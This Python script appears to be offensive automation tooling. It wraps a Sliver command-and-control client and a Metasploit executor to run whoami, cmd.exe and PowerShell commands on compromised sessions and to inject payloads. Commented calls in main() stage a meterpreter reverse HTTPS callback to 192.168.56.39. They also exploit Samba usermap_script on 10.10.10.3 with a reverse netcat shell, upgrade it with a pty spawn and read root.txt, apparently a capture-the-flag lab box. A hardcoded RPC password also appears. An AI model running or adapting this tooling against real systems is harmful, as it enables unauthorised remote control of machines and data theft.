#!/usr/bin/python3

import os
import asyncio
from sliver import SliverClientConfig, SliverClient

from Metasploit import MetasploitExecutor

class SliverExecutor:
    def __init__(self, config_path):
        """
        It sets up the initial state by assigning values to instance attributes.
        """
        self.config_path = config_path
        self.config = SliverClientConfig.parse_config_file(self.config_path)
        self.client = SliverClient(self.config)

    
    async def print_sessions(self):
        ''' Async client connect example '''
        await self.client.connect()
        sessions = await self.client.sessions()
        print('Sessions: %r' % sessions)

    async def ls(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(session_id)  # <-- Create InteractiveSession object
        ls = await session.ls()                                  # <-- Returns an Ls Protobuf object
        print('Listing directory contents of: %s' % ls.Path)
        for fi in ls.Files:
            print('FileName: %s (dir: %s, size: %d)' % (fi.Name, fi.IsDir, fi.Size))

    async def whoami(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(session_id)  # <-- Create InteractiveSession object
        exec_result = await session.execute('whoami', [], True)
        print('Exec %r' % exec_result)

    async def cmd(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(session_id)  # <-- Create InteractiveSession object
        exec_result = await session.execute('cmd.exe', ['\c', 'dir'], True)
        print(type(exec_result))
        print('Exec %r' % exec_result)

    async def powershell(self, session_id):
        await self.client.connect()
        session = await self.client.interact_session(session_id)  # <-- Create InteractiveSession object
        exec_result = await session.execute('powershell.exe', ["-Command", '"Get-Process"'], True)
        print('Exec %r' % exec_result)

    async def msf(self, session_id, payload, lhost, lport):
        await self.client.connect()
        session = await self.client.interact_session(session_id)  # <-- Create InteractiveSession object
        await session.msf(payload, lhost, lport, '', 1)


async def main():
    # sliver_exe = SliverExecutor(os.path.join('/home/user/Downloads', 'zer0cool.cfg'))
    # await sliver_exe.print_sessions()
    # await sliver_exe.cmd("3f8a89a3-9f23-4195-b53f-7399520ecfe2")
    # await sliver_exe.powershell("3f8a89a3-9f23-4195-b53f-7399520ecfe2")
    # await sliver_exe.msf("3f8a89a3-9f23-4195-b53f-7399520ecfe2", "payload/windows/x64/meterpreter_reverse_https", "192.168.56.39", 9091)

    me = MetasploitExecutor(password = 'z6ngfe5P', host_ip = '127.0.0.1', listening_port=55552)

    # me.exploit_and_execute_payload(
    #     target = '10.10.10.3',
    #     exploit_module_name = 'multi/samba/usermap_script',
    #     payload_module_name= 'cmd/unix/reverse_netcat'
    #     )

    # me.communicate_with_msf_session(
    #     session_id = '1',
    #     input_text = 'help'
    #     )

    # me.communicate_with_msf_session(
    #     session_id = '1',
    #     input_text = "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
    #     )

    # me.communicate_with_msf_session(
    #     session_id = '1',
    #     input_text = "cd root"
    #     )

    # me.communicate_with_msf_session(
    #     session_id = '1',
    #     input_text = "cat root.txt"
    #     )

if __name__ == '__main__':
    asyncio.run(main())



